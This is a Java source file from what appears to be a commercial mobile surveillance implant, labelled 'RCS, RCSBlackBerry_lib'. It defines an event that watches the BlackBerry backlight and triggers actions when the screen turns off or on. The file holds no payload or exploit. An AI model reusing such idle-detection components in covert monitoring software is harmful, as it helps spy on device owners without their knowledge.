//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ScreenSaverEvent
 * Created      : 26-mag-2010
 * *************************************************/

package blackberry.event;

import blackberry.AppListener;
import blackberry.config.ConfEvent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.BacklightObserver;

public class EventStandby extends Event implements BacklightObserver{
    //#ifdef DEBUG
    private static Debug debug = new Debug("ScreenSaverEvent",
            DebugLevel.VERBOSE);
    //#endif

    public boolean parse(ConfEvent event) {
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected final void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart: ScreenSaverEvent");
        //#endif
        AppListener.getInstance().addBacklightObserver(this);
        //AppListener.getInstance().addApplicationObserver(this);
    }

    public void actualLoop() {

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected final void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop: ScreenSaverEvent");
        //#endif
        AppListener.getInstance().removeBacklightObserver(this);
        //AppListener.getInstance().removeApplicationObserver(this);
        onExit();
    }

    public final void onBacklightChange(final boolean enabled) {
        //#ifdef DEBUG
        debug.trace("onBacklightChange: " + enabled);
        //#endif
        if (!enabled) {
            onEnter();
        } else {
            onExit();
        }
    }

}
